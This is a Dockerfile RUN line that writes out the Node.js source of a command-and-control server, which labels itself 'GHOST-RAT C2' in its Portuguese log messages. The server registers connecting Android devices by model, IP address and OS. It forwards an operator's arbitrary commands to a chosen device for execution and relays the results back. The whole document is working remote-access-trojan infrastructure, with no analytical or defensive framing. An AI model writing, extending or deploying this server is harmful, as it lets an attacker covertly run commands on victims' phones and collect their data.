RUN echo 'const express = require('"'"'express'"'"');const app = express();const http = require('"'"'http'"'"').Server(app);const io = require('"'"'socket.io'"'"')(http);const path = require('"'"'path'"'"');const devices = {};app.use(express.static('"'"'public'"'"'));app.get('"'"'/'"'"', (req, res) => { res.sendFile(path.join(__dirname, '"'"'public'"'"', '"'"'index.html'"'"')); });io.on('"'"'connection'"'"', (socket) => { const ip = socket.handshake.headers['"'"'x-forwarded-for'"'"'] || socket.handshake.address; socket.on('"'"'register'"'"', (data) => { socket.deviceId = socket.id; devices[socket.id] = { id: socket.id, model: data.model || '"'"'Android Device'"'"', ip: ip, os: data.os || '"'"'Unknown'"'"' }; io.emit('"'"'updateDevices'"'"', devices); console.log('"'"'Novo dispositivo registrado:'"'"', devices[socket.id]); }); socket.on('"'"'command'"'"', (data) => { if (data.target && io.sockets.sockets.get(data.target)) { io.to(data.target).emit('"'"'execute'"'"', { cmd: data.cmd }); } }); socket.on('"'"'result'"'"', (data) => { io.emit('"'"'response'"'"', { from: devices[socket.id] ? devices[socket.id].model : '"'"'Unknown'"'"', msg: data.msg, type: data.type, data: data.data }); }); socket.on('"'"'disconnect'"'"', () => { if (devices[socket.id]) { console.log('"'"'Dispositivo desconectado:'"'"', devices[socket.id].model); delete devices[socket.id]; io.emit('"'"'updateDevices'"'"', devices); } });});const PORT = process.env.PORT || 8080;http.listen(PORT, () => { console.log('"'"'GHOST-RAT C2 rodando na porta '"'"' + PORT); });' > server.js
